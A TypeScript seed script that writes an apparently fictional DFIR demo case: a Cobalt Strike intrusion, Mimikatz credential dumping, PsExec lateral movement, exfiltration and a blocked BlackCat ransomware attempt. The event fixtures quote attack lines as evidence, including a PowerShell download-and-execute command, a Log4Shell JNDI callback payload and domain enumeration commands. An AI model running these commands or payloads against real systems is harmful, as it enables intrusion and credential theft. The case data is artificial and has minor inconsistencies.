        timestamp: ts(15, 10, 15),
        description: "update.dll written to C:\\Users\\jsmith\\AppData\\Roaming\\ (SHA-256: " + SHA_DROPPER + ", 38 KB). DLL loads Cobalt Strike stager reflectively on next logon.",
        severity: "High",
        mitreTechniques: ["T1053.005"],
        relatedFindingIds: ["f006"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sha256: SHA_DROPPER,
        path: "c:\\users\\jsmith\\appdata\\roaming\\update.dll",
        action: "write" as const,
      },
      {
        id: "e009",
        timestamp: ts(15, 10, 45),
        description: "svchost32.exe injected shellcode into legitimate svchost.exe (pid 788, services: RpcSs). Classic Cobalt Strike process injection via NtQueueApcThread.",
        severity: "Critical",
        mitreTechniques: ["T1055"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["CrowdStrike Falcon"],
        processName: "svchost.exe",
        parentName: "svchost32.exe",
      },
      {
        id: "e010",
        timestamp: ts(15, 11, 30),
        description: "cmd.exe (child of svchost.exe pid 788) ran: nltest /dclist:globaltech.local && net user /domain && net group \"Domain Admins\" /domain && arp -a",
        severity: "Medium",
        mitreTechniques: ["T1016", "T1018", "T1069.002"],
        relatedFindingIds: ["f008"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        processName: "cmd.exe",
        parentName: "svchost.exe",
      },
      {
        id: "e011",
        timestamp: ts(15, 11, 31),
        description: "nltest output confirmed: DC01.globaltech.local (\\\\10.10.20.15) is the primary DC. Domain admin group membership enumerated: 4 members.",
        severity: "Info",
        mitreTechniques: ["T1018"],
        relatedFindingIds: ["f008"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
      },
      // Day 2 — Lateral movement + credential dump
      {
        id: "e012",
        timestamp: ts(16, 8, 22),
        description: "PsExec.exe executed from WKSTN-JSMITH targeting DC01 (10.10.20.15). Command: PsExec.exe \\\\DC01 -s cmd.exe. EventID 4648 on DC01 (explicit credential logon, account: jsmith).",
        severity: "Critical",
        mitreTechniques: ["T1021.002"],
        relatedFindingIds: ["f004"],
        sourceScreenshots: [],
        asset: "DC01",
        sources: ["Velociraptor", "Chainsaw"],
        processName: "PsExec.exe",
        parentName: "svchost.exe",
        srcIp: "10.10.10.45",
        dstIp: "10.10.20.15",
        port: 445,
        action: "network_send" as const,
      },
      {
        id: "e013",
        timestamp: ts(16, 8, 23),
        description: "Service 'PSEXESVC' installed on DC01 (EventID 7045). Image path: %SystemRoot%\\PSEXESVC.exe. Service type: Interactive. Ran as SYSTEM.",
        severity: "Critical",
        mitreTechniques: ["T1021.002"],
        relatedFindingIds: ["f004"],
        sourceScreenshots: [],
        asset: "DC01",
        sources: ["Chainsaw"],
      },
      {
        id: "e014",
        timestamp: ts(16, 8, 43),
        description: "Mimikatz (SHA-256: " + SHA_MIMIKATZ + ") uploaded to DC01 C:\\Windows\\Temp\\m64.exe and executed under PSEXESVC SYSTEM context.",
        severity: "Critical",
        mitreTechniques: ["T1003.001"],
        relatedFindingIds: ["f002"],
        sourceScreenshots: [],
        asset: "DC01",
        sha256: SHA_MIMIKATZ,
        md5: MD5_MIMIKATZ,
        path: "c:\\windows\\temp\\m64.exe",
        sources: ["THOR"],
        action: "execute" as const,
        processName: "m64.exe",
        parentName: "PSEXESVC.exe",
        chainCheck: {
          observed: false,
          note: "PSEXESVC.exe → m64.exe (Mimikatz) NOT observed — execution of credential theft tool",
          checkedAt: "2026-05-22T11:05:00.000Z",
        },
      },
      {
        id: "e015",
        timestamp: ts(16, 8, 45),
        description: "Mimikatz sekurlsa::logonpasswords executed on DC01. LSASS process (pid 672) accessed with handle rights 0x1FFFFF. 3 DA accounts + 12 service accounts credential material extracted.",
        severity: "Critical",
        mitreTechniques: ["T1003.001"],
        relatedFindingIds: ["f002"],
        sourceScreenshots: [],
        asset: "DC01",
        sources: ["THOR", "CrowdStrike Falcon"],
      },
      {
        id: "e016",
        timestamp: ts(16, 9, 30),
        description: "C2 beacon callback volume increased on WKSTN-JSMITH: 12 HTTPS POST requests to 185.220.101.47 in 5-minute window. Consistent with operator interaction (manual tasking, not automated).",
        severity: "High",
        mitreTechniques: ["T1071.001"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        srcIp: "10.10.10.45",
        dstIp: "185.220.101.47",
        port: 443,
        action: "network_send" as const,
        count: 12,
        endTimestamp: ts(16, 9, 35),
      },
      {
        id: "e017",
        timestamp: ts(16, 10, 0),
        description: "PsExec lateral movement to FS01 (10.10.20.30) using domain admin credentials. EventID 4648 and 7045 recorded on FS01. Service PSEXESVC created (SYSTEM).",
        severity: "Critical",
        mitreTechniques: ["T1021.002"],
        relatedFindingIds: ["f004"],
        sourceScreenshots: [],
        asset: "FS01",
        sources: ["Chainsaw"],
        srcIp: "10.10.10.45",
        dstIp: "10.10.20.30",
        port: 445,
        action: "network_send" as const,
      },
      {
        id: "e018",
        timestamp: ts(16, 10, 5),
        description: "PsExec lateral movement to WEB01 (10.10.20.40) using domain admin credentials. EventID 4648 and 7045 recorded on WEB01. Service PSEXESVC created (SYSTEM).",
        severity: "Critical",
        mitreTechniques: ["T1021.002"],
        relatedFindingIds: ["f004"],
        sourceScreenshots: [],
        asset: "WEB01",
        sources: ["Chainsaw"],
        srcIp: "10.10.10.45",
        dstIp: "10.10.20.40",
        port: 445,
        action: "network_send" as const,
      },
      // Day 3 — Data staging
      {
        id: "e019",
        timestamp: ts(17, 2, 15),
        description: "DNS query for cobaltkit.xyz resolved to 185.220.101.47 from WKSTN-JSMITH. Overnight C2 beacon activity: 38 callbacks recorded (21:00 May 16 – 08:00 May 17). Attacker maintaining foothold.",
        severity: "High",
        mitreTechniques: ["T1071.001"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        count: 38,
        endTimestamp: ts(17, 8, 0),
      },
      {
        id: "e020",
        timestamp: ts(17, 14, 30),
        description: "Recursive copy of \\\\FS01\\Finance$ initiated from DC01 admin session. Files staged to C:\\Windows\\Temp\\backup\\ on FS01. xcopy used with /E /H /C flags. Total: 3,412 files.",
        severity: "High",
        mitreTechniques: ["T1560.001"],
        relatedFindingIds: ["f005"],
        sourceScreenshots: [],
        asset: "FS01",
      },
      {
        id: "e021",
        timestamp: ts(17, 15, 45),
        description: "7-Zip (7z.exe) executed on FS01 to compress C:\\Windows\\Temp\\backup\\ → data.7z with password 'Xk9#mP2$qR'. Archive size: 2.3 GB. Password-protected archive significantly hinders content analysis.",
        severity: "High",
        mitreTechniques: ["T1560.001"],
        relatedFindingIds: ["f005"],
        sourceScreenshots: [],
        asset: "FS01",
        path: "c:\\windows\\temp\\backup\\data.7z",
        processName: "7z.exe",
        parentName: "cmd.exe",
        action: "write" as const,
      },
      // Day 4 — Exfiltration
      {
        id: "e022",
        timestamp: ts(18, 2, 30),
        description: "FTP connection attempt from FS01 to 185.220.101.47:21 for data.7z upload. Blocked by perimeter firewall (outbound FTP rule, policy GFW-DENY-FTP-OUT). FTP blocked in 3 seconds.",
        severity: "High",
        mitreTechniques: ["T1048.002"],
        relatedFindingIds: ["f005"],
        sourceScreenshots: [],
        asset: "FS01",
        sources: ["Suricata"],
        srcIp: "10.10.20.30",
        dstIp: "185.220.101.47",
        port: 21,
        action: "network_send" as const,
      },
      {
        id: "e023",
        timestamp: ts(18, 2, 31),
        description: "HTTPS POST to 185.220.101.47:443 from FS01 — chunked upload of data.7z. Firewall allowed (HTTPS policy). Session lasted 67 seconds. Bytes sent: ~847 MB before session terminated by firewall threshold.",
        severity: "Critical",
        mitreTechniques: ["T1048.002"],
        relatedFindingIds: ["f005"],
        sourceScreenshots: [],
        asset: "FS01",
        sources: ["Suricata", "CrowdStrike Falcon"],
        srcIp: "10.10.20.30",
        dstIp: "185.220.101.47",
        port: 443,
        action: "network_send" as const,
      },
      {
        id: "e024",
        timestamp: ts(18, 2, 38),
        description: "Suricata alert: ET POLICY Large HTTPS Upload Detected (FS01 → 185.220.101.47). Alert triggered at 300 MB threshold. Session continued until session-bytes limit hit at ~847 MB.",
        severity: "High",
        mitreTechniques: ["T1048.002"],
        relatedFindingIds: ["f005"],
        sourceScreenshots: [],
        asset: "FS01",
        sources: ["Suricata"],
      },
      // Day 5 — Ransomware deployment attempt
      {
        id: "e025",
        timestamp: ts(19, 21, 45),
        description: "New inbound connection from 185.220.101.47 to beacon on DC01. Operator re-tasked DC01 session for ransomware staging. Increased C2 traffic volume (25 POSTs in 10 min) suggests preparation.",
        severity: "High",
        mitreTechniques: ["T1071.001"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "DC01",
        srcIp: "185.220.101.47",
        dstIp: "10.10.20.15",
        port: 443,
        action: "network_receive" as const,
        count: 25,
        endTimestamp: ts(19, 21, 55),
      },
      {
        id: "e026",
        timestamp: ts(19, 22, 15),
        description: "Ransomware binary encrypt.exe (SHA-256: " + SHA_RANSOM + ") written to C:\\Windows\\Temp\\ on DC01, FS01, and WEB01 simultaneously via SMB. File matches BlackCat/ALPHV family.",
        severity: "Critical",
        mitreTechniques: ["T1486"],
        relatedFindingIds: ["f007"],
        sourceScreenshots: [],
        sha256: SHA_RANSOM,
        path: "c:\\windows\\temp\\encrypt.exe",
        sources: ["CrowdStrike Falcon"],
        action: "write" as const,
        count: 3,
      },
      {
        id: "e027",
        timestamp: ts(19, 22, 16),
        description: "CrowdStrike Falcon detected encrypt.exe on first execution attempt on FS01 (behavioral detection: 'Ransomware Activity Detected'). Process terminated in 0.3 seconds. File quarantined.",
        severity: "Critical",
        mitreTechniques: ["T1486"],
        relatedFindingIds: ["f007"],
        sourceScreenshots: [],
        asset: "FS01",
        sources: ["CrowdStrike Falcon"],
        sha256: SHA_RANSOM,
        path: "c:\\windows\\temp\\encrypt.exe",
      },
      {
        id: "e028",
        timestamp: ts(19, 22, 17),
        description: "CrowdStrike quarantined encrypt.exe on DC01 and WEB01 (same hash — same detection). No files were encrypted on any host. EDR policy prevented execution before any file handles opened.",
        severity: "High",
        mitreTechniques: ["T1486"],
        relatedFindingIds: ["f007"],
        sourceScreenshots: [],
        sources: ["CrowdStrike Falcon"],
        sha256: SHA_RANSOM,
        count: 2,
      },
      // Day 6+ — SIEM follow-up alerts
      {
        id: "e029",
        timestamp: ts(21, 9, 0),
        description: "SIEM alert: Unusual SMB lateral movement volume — 847 SMB connections from WKSTN-JSMITH to 3 hosts in 24 h (May 16). Alert triggered 5 days after activity due to correlation rule delay.",
        severity: "Medium",
        mitreTechniques: ["T1021.002"],
        relatedFindingIds: ["f004"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["SIEM"],
        count: 847,
      },
      {
        id: "e030",
        timestamp: ts(21, 9, 5),
        description: "SIEM alert: DC01 high failed logon count — 214 EventID 4625 in 1 hour (May 16 08:20–08:20). Likely credential spraying or password reuse attempts using Mimikatz-dumped hashes.",
        severity: "High",
        mitreTechniques: ["T1003.001"],
        relatedFindingIds: ["f002"],
        sourceScreenshots: [],
        asset: "DC01",
        sources: ["SIEM"],
        count: 214,
        endTimestamp: ts(21, 9, 20),
      },
      {
        id: "e031",
        timestamp: ts(22, 8, 0),
        description: "THOR scan of WKSTN-JSMITH completed: detected svchost32.exe (THOR Score 100, CobaltStrike C2), update.dll (THOR Score 90, CobaltStrike loader), and 3 additional suspicious registry keys under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
        severity: "Critical",
        mitreTechniques: ["T1071.001", "T1053.005"],
        relatedFindingIds: ["f001", "f006"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["THOR"],
      },
      // CVE exploitation events (KEV demo) — attacker probed WEB01's unpatched services before
      // using phishing as the primary vector. CVE-2021-41773 + CVE-2021-44228 are both in the
      // CISA KEV catalog with ransomware campaign association. These appear in KEV synthesis
      // context and in report §4.5.1 when the CISA catalog is loaded (Settings → KEV).
      {
        id: "e039",
        timestamp: ts(15, 8, 30),
        description: "Suricata IDS alert: Apache path traversal exploitation attempt (CVE-2021-41773) from 185.220.101.47 targeting WEB01:8080 — 14 requests in 60 s matching ET WEB_SERVER Apache 2.4.49 Path Traversal rule. WEB01 running Apache httpd 2.4.49 (unpatched; CVE-2021-41773 allows unauthenticated RCE via mod_cgi). Attacker began web exploitation 44 min before the phishing email arrived.",
        severity: "High",
        mitreTechniques: ["T1190"],
        relatedFindingIds: ["f009"],
        sourceScreenshots: [],
        asset: "WEB01",
        sources: ["Suricata"],
        srcIp: "185.220.101.47",
        dstIp: "10.10.20.40",
        port: 8080,
        action: "network_receive" as const,
        count: 14,
      },
      {
        id: "e040",
        timestamp: ts(15, 8, 40),
        description: "CVE-2021-41773 RCE confirmed on WEB01: Apache httpd (pid 3341) spawned cmd.exe (pid 3342) via mod_cgi path traversal (/../bin/sh) — unauthenticated remote code execution. Child process ran: powershell.exe -NoP -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cdn-update.microsofttech.net/init.ps1')\". Alternate initial access via web exploitation confirmed independent of the phishing email.",
        severity: "Critical",
        mitreTechniques: ["T1190", "T1059.001"],
        relatedFindingIds: ["f009", "f001"],
        sourceScreenshots: [],
        asset: "WEB01",
        sources: ["CrowdStrike Falcon"],
        processName: "cmd.exe",
        parentName: "httpd.exe",
        chainCheck: {
          observed: false,
          note: "httpd.exe → cmd.exe NOT in behavioral baseline — classic CVE-2021-41773 mod_cgi shell spawn",
          checkedAt: "2026-05-22T11:00:00.000Z",
        },
      },
      {
        id: "e041",
        timestamp: ts(15, 8, 55),
        description: "SIEM alert: JNDI LDAP callback from WEB01 Java process (Tomcat 9, pid 2018) to 185.220.101.47:1389 — matches Log4Shell exploitation pattern (CVE-2021-44228, CVSS 10.0). WEB01 Tomcat application uses Log4j 2.14.1 (unpatched; CVE-2021-44228 affects Log4j 2.0-beta9 through 2.14.1). JNDI lookup triggered via HTTP User-Agent header: ${jndi:ldap://185.220.101.47:1389/a}. Both CVE-2021-41773 and CVE-2021-44228 exploited on WEB01 within 25 min of each other.",
        severity: "Critical",
        mitreTechniques: ["T1190"],
        relatedFindingIds: ["f009"],
        sourceScreenshots: [],
        asset: "WEB01",
        sources: ["SIEM", "Suricata"],
        srcIp: "10.10.20.40",
        dstIp: "185.220.101.47",
        port: 1389,
        action: "network_send" as const,
      },
      // Periodic Cobalt Strike beacon check-ins (T1071.001) — WKSTN-JSMITH → 185.220.101.47:443
      // roughly every 60 min with a few seconds of jitter, the classic C2 callback cadence. Each
      // check-in is low-signal on its own (Low severity); the REGULARITY across the series is the
      // signal, which the Beacon Candidates detector surfaces (#82). Together with e006 these form a
      // single (source → dest:port) channel the detector flags High (external/public destination).
      ...[
        { h: 10, m: 51, s: 4 },
        { h: 11, m: 51, s: 22 },
        { h: 12, m: 50, s: 58 },
        { h: 13, m: 51, s: 11 },
        { h: 14, m: 51, s: 33 },
        { h: 15, m: 52, s: 2 },
        { h: 16, m: 51, s: 49 },
        { h: 17, m: 51, s: 8 },
        { h: 18, m: 51, s: 27 },
        { h: 19, m: 51, s: 15 },
      ].map((t, i) => ({
        id: `e${String(32 + i).padStart(3, "0")}`,
        timestamp: ts(15, t.h, t.m, t.s),
        description: `Cobalt Strike beacon check-in: HTTPS GET to 185.220.101.47:443 (cobaltkit.xyz), ~4 KB response. Routine periodic callback (sleep≈60m, JA3 matches CobaltStrike default).`,
        severity: "Low" as const,
        mitreTechniques: ["T1071.001"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["Suricata"],
        srcIp: "10.10.10.45",
        dstIp: "185.220.101.47",
        port: 443,
        action: "network_send" as const,
      })),
    ],

    timeline: [
      {
        timestamp: "2026-05-22T09:00:00.000Z",
        windowSequence: 1,
        description: "Analyst reviewed EDR alert dashboard — CrowdStrike ransomware block alerts on DC01, FS01, WEB01. Opened incident case.",
        sourceScreenshots: [],
      },
      {
        timestamp: "2026-05-22T09:30:00.000Z",
        windowSequence: 2,
        description: "Reviewed Suricata HTTPS upload alert from May 18. Confirmed data.7z exfiltration to C2 IP. Added C2 IP and domain as IOCs.",
        sourceScreenshots: [],
      },
      {
        timestamp: "2026-05-22T10:00:00.000Z",
        windowSequence: 3,
        description: "Imported THOR scan results (WKSTN-JSMITH). Beacon and loader identified. Timeline updated with 12 new events.",
        sourceScreenshots: [],
      },
      {
        timestamp: "2026-05-22T10:30:00.000Z",
        windowSequence: 4,
        description: "Ran Chainsaw on DC01 EVTX export. Confirmed PsExec, Mimikatz execution, and PSEXESVC service install. 19 new events added.",
        sourceScreenshots: [],
      },
      {
        timestamp: "2026-05-22T11:00:00.000Z",
        windowSequence: 5,
        description: "Ran synthesis. Attacker path reconstructed end-to-end. 8 findings produced (2 Critical, 3 High, 2 Medium, 1 Low). Credentails compromise and exfiltration flagged.",
        sourceScreenshots: [],
      },
    ],
  };

  await write(join(CASE_DIR, "state", "investigation.json"), investigation);

  // ── scope.json ─────────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "scope.json"), {
    start: "2026-05-14T00:00:00.000Z",
    end: "2026-05-23T23:59:59.999Z",
  });

  // ── legitimate.json ─────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "legitimate.json"), [
    {
      id: "ioc:10.10.0.1",
      kind: "ioc",
      ref: "10.10.0.1",
      note: "GlobalTech primary DNS server — legitimate infrastructure",
      markedAt: "2026-05-22T10:15:00.000Z",
      label: "Internal DNS",
    },
    {
      id: "ioc:10.10.0.50",
      kind: "ioc",
      ref: "10.10.0.50",
      note: "GlobalTech WSUS server — seen in update traffic, not malicious",
      markedAt: "2026-05-22T10:16:00.000Z",
      label: "WSUS Server",
    },
    {
      id: "finding:routine software update",
      kind: "finding",
      ref: "routine software update",
      note: "Scheduled Patch Tuesday activity on May 14 — pre-dates incident and is benign",
      markedAt: "2026-05-22T10:17:00.000Z",
    },
  ]);

  // ── ai-control.json ────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "ai-control.json"), {
    enabled: false,
    lastAnalyzedSeq: 5,
  });

  // ── enrich-control.json ────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "enrich-control.json"), {
    providers: ["virustotal", "abuseipdb", "huntingch"],
  });

  // ── anon-control.json ──────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "anon-control.json"), {
    enabled: false,
    categories: { IP: true, EMAIL: true, USER: true, HOST: true, DOMAIN: true, PATH: true },
    redactSecrets: true,
  });

  // ── tags.json ──────────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "tags.json"), [
    { id: "tag001", targetType: "ioc",     targetId: "ioc001", label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:20:00.000Z" },
    { id: "tag002", targetType: "ioc",     targetId: "ioc002", label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:20:00.000Z" },
    { id: "tag003", targetType: "ioc",     targetId: "ioc004", label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:21:00.000Z" },
    { id: "tag004", targetType: "ioc",     targetId: "ioc005", label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:21:00.000Z" },
    { id: "tag005", targetType: "ioc",     targetId: "ioc006", label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:21:00.000Z" },
    { id: "tag006", targetType: "ioc",     targetId: "ioc014", label: "pivot-point",         author: "Demo Analyst", createdAt: "2026-05-22T10:22:00.000Z" },
    { id: "tag007", targetType: "event",   targetId: "e004",   label: "key-evidence",        author: "Demo Analyst", createdAt: "2026-05-22T10:23:00.000Z" },
    { id: "tag008", targetType: "event",   targetId: "e006",   label: "c2-comms",            author: "Demo Analyst", createdAt: "2026-05-22T10:23:00.000Z" },
    { id: "tag009", targetType: "event",   targetId: "e007",   label: "persistence",         author: "Demo Analyst", createdAt: "2026-05-22T10:23:00.000Z" },
    { id: "tag010", targetType: "event",   targetId: "e012",   label: "lateral-movement",    author: "Demo Analyst", createdAt: "2026-05-22T10:24:00.000Z" },
    { id: "tag011", targetType: "event",   targetId: "e015",   label: "credential-access",   author: "Demo Analyst", createdAt: "2026-05-22T10:24:00.000Z" },
    { id: "tag012", targetType: "event",   targetId: "e023",   label: "exfil",               author: "Demo Analyst", createdAt: "2026-05-22T10:25:00.000Z" },
    { id: "tag013", targetType: "event",   targetId: "e027",   label: "key-evidence",        author: "Demo Analyst", createdAt: "2026-05-22T10:25:00.000Z" },
    { id: "tag014", targetType: "finding", targetId: "f001",   label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:26:00.000Z" },
    { id: "tag015", targetType: "finding", targetId: "f002",   label: "confirmed-malicious", author: "Demo Analyst", createdAt: "2026-05-22T10:26:00.000Z" },
    { id: "tag016", targetType: "finding", targetId: "f005",   label: "needs-review",        author: "Demo Analyst", createdAt: "2026-05-22T10:27:00.000Z" },
    { id: "tag017", targetType: "event",   targetId: "e002",   label: "initial-access",      author: "Demo Analyst", createdAt: "2026-05-22T10:27:00.000Z" },
  ]);

  // ── comments.json ──────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "comments.json"), [
    {
      id: "cmt001",
      targetType: "ioc",
      targetId: "ioc001",
      author: "Demo Analyst",
      text: "Confirmed C2 IP — VirusTotal 58/73, AbuseIPDB 100% confidence. Shodan shows port 443 open with self-signed cert CN=CobaltStrike. IP is part of the known Frantech/BuyVM hosting ASN used extensively for offensive ops.",
      createdAt: "2026-05-22T10:30:00.000Z",
    },
    {
      id: "cmt002",
      targetType: "finding",
      targetId: "f002",
      author: "Demo Analyst",
      text: "Customer confirmed: no authorized use of Mimikatz or any credential dumping tool. The 3 DA accounts affected are: svc-backup, admin-deploy, and globaldomain\\Administrator. Customer is resetting all now.",
      createdAt: "2026-05-22T11:00:00.000Z",
    },
    {
      id: "cmt003",
      targetType: "finding",
      targetId: "f005",
      author: "Demo Analyst",
      text: "Firewall team confirmed: 847.3 MB sent in a single HTTPS session from FS01 to 185.220.101.47 at 02:31:14 on May 18. The session was terminated at the 1 GB egress threshold. DLP was not monitoring the Finance share. Customer legal notified for breach assessment.",
      createdAt: "2026-05-22T11:15:00.000Z",
    },
    {
      id: "cmt004",
      targetType: "finding",
      targetId: "f003",
      author: "Demo Analyst",
      text: "Email header analysis: DKIM = FAIL, SPF = FAIL. Sender IP 91.108.4.72 (Telegram CDN range — likely compromised). Email slipped through because the From domain (globaltech-vendor.com) was registered 3 days prior and not in the blocklist. Domain lookalike attack.",
      createdAt: "2026-05-22T11:30:00.000Z",
    },
    {
      id: "cmt005",
      targetType: "event",
      targetId: "e023",
      author: "Demo Analyst",
      text: "HTTPS session terminated by the firewall's 1 GB per-session egress policy at 847 MB. The remaining ~1.4 GB of the 2.3 GB archive was not sent. However, the first 847 MB likely contains the most recently modified files (xcopy /E preserves mtime, 7z stores newest first by default).",
      createdAt: "2026-05-22T12:00:00.000Z",
    },
    {
      id: "cmt006",
      targetType: "finding",
      targetId: "f007",
      author: "Demo Analyst",
      text: "BlackCat/ALPHV ransomware confirmed via YARA match (rule BlackCat_strings_v2). The binary uses Rust, matches the ALPHV encryptor profile with UUID-based marker files. Operator likely planned triple-extortion: encrypt + exfiltrate + DDoS threat. EDR stopped the encrypt phase.",
      createdAt: "2026-05-22T12:30:00.000Z",
    },
  ]);

  // ── report-meta.json ───────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "report-meta.json"), {
    companyName: "YourFirm IR",
    companyLogo: "",
    organization: "GlobalTech Industries",
    incidentId: "IR-2026-047",
    investigators: ["Demo Analyst", "Senior DFIR Analyst"],
    reviewer: "IR Team Lead",
    incidentManager: "CISO — GlobalTech",
    restrictions: "CONFIDENTIAL / TLP:AMBER — Handle via need-to-know. Do not distribute outside listed recipients.",
    revisions: [
      { version: "0.1", date: "2026-05-22", author: "Demo Analyst",         comments: "Initial draft — preliminary findings" },
      { version: "0.2", date: "2026-05-23", author: "Demo Analyst",         comments: "Added credential dump scope, exfiltration details" },
      { version: "1.0", date: "2026-05-25", author: "Senior DFIR Analyst",  comments: "Final — reviewed and approved for release" },
    ],
    distribution: [
      { name: "Chris Reynolds",  role: "CISO, GlobalTech Industries",           method: "Encrypted email" },
      { name: "Sarah Kim",       role: "VP Engineering, GlobalTech Industries",  method: "Encrypted email" },
      { name: "Legal Counsel",   role: "GlobalTech Legal Team",                  method: "Encrypted email" },
      { name: "IR Team Lead",    role: "YourFirm IR",                            method: "Internal" },
    ],
    includeDisclaimer: true,
    intendedAudience:
      "This report is intended for technical security staff and executive leadership at GlobalTech Industries. " +
      "Section 2 (Executive Summary) and Section 4.5 (Customer Exposure) are written for non-technical readers. " +
      "Sections 3–4 assume familiarity with Windows internals and DFIR concepts.",
    executiveSummary:
      "Between May 15 and May 22, 2026, GlobalTech Industries suffered a targeted intrusion by a " +
      "threat actor assessed with high confidence to be affiliated with the BlackCat/ALPHV ransomware group. " +
      "The attacker gained initial access via a spear-phishing email, established a persistent backdoor, " +
      "stole domain administrator credentials, and exfiltrated approximately 847 MB of finance data before " +
      "being partially blocked. A ransomware deployment was stopped by the company's endpoint security tool, " +
      "preventing encryption of company data. Immediate containment actions are required: isolate the " +
      "compromised workstation, reset all privileged credentials, and assess regulatory obligations for the " +
      "data exfiltration.",
    businessImpact:
      "**Data Exfiltration (~847 MB):** Finance share data from Q1 2026 was likely included. Contents may " +
      "include financial statements, payroll records, and vendor contracts. Regulatory assessment under GDPR " +
      "and PCI-DSS is required within 72 hours.\n\n" +
      "**Credential Compromise:** Three domain administrator accounts and 12 service accounts were " +
      "compromised. Active sessions may persist until password resets are completed.\n\n" +
      "**Ransomware Attempt Blocked:** No files were encrypted. EDR containment was effective.\n\n" +
      "**Operational Risk:** Cobalt Strike beacon may still be active on WKSTN-JSMITH and lateral hosts. " +
      "Complete eradication requires isolation and reimaging of up to 4 hosts.",
    investigationLimitations:
      "- Finance share file inventory not yet completed; exact exfiltrated content is unknown.\n" +
      "- EDR telemetry from WEB01 is incomplete due to agent version mismatch.\n" +
      "- Email gateway logs older than 14 days were not available; pre-incident phishing to other users cannot be ruled out.\n" +
      "- Forensic imaging of FS01 and WEB01 disks not yet completed at time of report.",
    investigationGoals:
      "1. Determine the initial access vector and timeline of the intrusion.\n" +
      "2. Identify all compromised systems and accounts.\n" +
      "3. Scope the data exfiltration — what data left the network.\n" +
      "4. Confirm the attacker's objective and whether ransomware deployment was the final stage.\n" +
      "5. Provide actionable remediation and hardening recommendations.",
    glossary: [
      { term: "Cobalt Strike",  explanation: "A commercial penetration testing framework widely abused by threat actors for post-exploitation. The 'beacon' is the implant that communicates with the attacker's C2 server." },
      { term: "C2",             explanation: "Command and Control — the infrastructure used by the attacker to send commands to and receive results from compromised systems." },
      { term: "LSASS",          explanation: "Local Security Authority Subsystem Service — the Windows process that stores credential material in memory. Credential dumpers like Mimikatz target it." },
      { term: "PsExec",         explanation: "A Sysinternals tool for executing processes on remote systems. Frequently abused by threat actors for lateral movement." },
      { term: "MITRE ATT&CK",   explanation: "A publicly available knowledge base of adversary tactics, techniques, and procedures (TTPs) used to classify observed attacker behaviour." },
      { term: "IOC",            explanation: "Indicator of Compromise — an artifact (IP address, domain, file hash, etc.) that indicates malicious activity with high confidence." },
      { term: "BlackCat/ALPHV", explanation: "A ransomware-as-a-service group active since 2021. Known for triple-extortion: encrypt, exfiltrate, and threaten DDoS/public leak." },
    ],
    conclusions:
      "The intrusion followed the classic Initial Access → Establish Persistence → Elevate/Dump Credentials → " +
      "Lateral Movement → Stage and Exfiltrate → Deploy Ransomware kill-chain. The threat actor demonstrated " +
      "operational discipline: off-hours exfiltration, password-protected archives, and coordinated multi-host " +
      "ransomware deployment. EDR prevented the final encryption stage. The exfiltration of ~847 MB from the " +
      "finance share is the primary residual risk and likely the actor's leverage for extortion even without " +
      "successful encryption.",
    recommendations: [
      "Immediately isolate WKSTN-JSMITH, DC01, FS01, and WEB01 for forensic imaging and reimaging.",
      "Reset all domain administrator and service account passwords; rotate the krbtgt password twice.",
      "Engage legal counsel within 24 hours to assess GDPR/PCI-DSS breach notification requirements for the ~847 MB exfiltration.",
      "Block cobaltkit.xyz, cdn-update.microsofttech.net, and 185.220.101.47 at perimeter firewall and DNS resolver.",
      "Enable enhanced logging: PowerShell Script Block Logging, Sysmon, WEF on all Tier-0 assets.",
      "Implement an email security gateway with DMARC enforcement to block spoofed-domain phishing.",
      "Review and reduce the scope of domain administrator accounts — apply least privilege and JIT access.",
      "Deploy DLP on the Finance share with an exfiltration alerting threshold below 500 MB per session.",
    ],
  });

  // ── customer.json ──────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "customer.json"), {
    domains: ["globaltech.com", "globaltech.co.uk"],
    emails: ["ciso@globaltech.com", "security@globaltech.com", "jsmith@globaltech.com"],
    providers: ["hibp", "dehashed"],
  });

  // ── customer-exposure.json ─────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "customer-exposure.json"), {
    checkedAt: "2026-05-22T13:00:00.000Z",
    results: [
      {
        input: "jsmith@globaltech.com",
        kind: "email",
        provider: "HIBP",
        breachNames: ["LinkedIn2021", "Collection1", "Adobe2013"],
        secretPresent: true,
        exposedFields: ["email", "password", "username"],
        summary: "3 breaches — credentials likely reused",
      },
      {
        input: "security@globaltech.com",
        kind: "email",
        provider: "HIBP",
        breachNames: ["Dropbox2012"],
        secretPresent: false,
        exposedFields: ["email", "username"],
        summary: "1 breach — no password exposed",
      },
      {
        input: "ciso@globaltech.com",
        kind: "email",
        provider: "HIBP",
        breachNames: [],
        secretPresent: false,
        exposedFields: [],
        summary: "No breaches found",
      },
      {
        input: "globaltech.com",
        kind: "domain",
